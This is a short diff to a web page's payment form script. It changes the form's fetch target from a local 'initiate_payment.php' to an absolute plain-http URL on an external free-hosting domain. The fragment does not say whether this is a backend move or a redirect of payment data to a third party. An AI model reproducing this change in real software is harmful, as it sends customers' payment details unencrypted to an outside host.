@@ -191,7 +191,7 @@
         document.getElementById('paymentForm').addEventListener('submit', function(event) {
             event.preventDefault();
             const formData = new FormData(this);
-            fetch('initiate_payment.php', {
+            fetch('http://ideallogisticsinvestments.free.nf/initiate_payment.php', {
                 method: 'POST',
                 body: formData
             })
